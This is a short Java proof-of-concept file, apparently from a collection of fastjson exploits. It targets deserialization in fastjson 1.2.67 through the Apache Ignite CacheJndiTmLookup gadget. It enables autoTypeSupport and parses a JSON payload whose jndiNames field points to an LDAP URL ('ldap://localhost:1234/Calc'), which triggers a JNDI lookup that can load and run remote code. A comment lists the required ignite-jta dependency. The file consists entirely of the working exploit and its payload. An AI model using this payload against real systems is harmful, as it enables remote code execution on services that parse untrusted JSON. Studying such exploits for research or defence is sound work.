package Poc;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import java.rmi.server.ExportException;
/*
    需要开启autoTypeSupport
    <dependency>
        <groupId>org.apache.ignite</groupId>
        <artifactId>ignite-jta</artifactId>
        <version>2.8.0</version>
    </dependency>
*/
public class Poc_1_2_67_a {
    public static void main(String[] args) throws ExportException {
        // turn on autoTypeSupport
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\", \"jndiNames\":[\"ldap://localhost:1234/Calc\"], \"tm\": {\"$ref\":\"$.tm\"}}";
        JSON.parse(payload);
    }
}
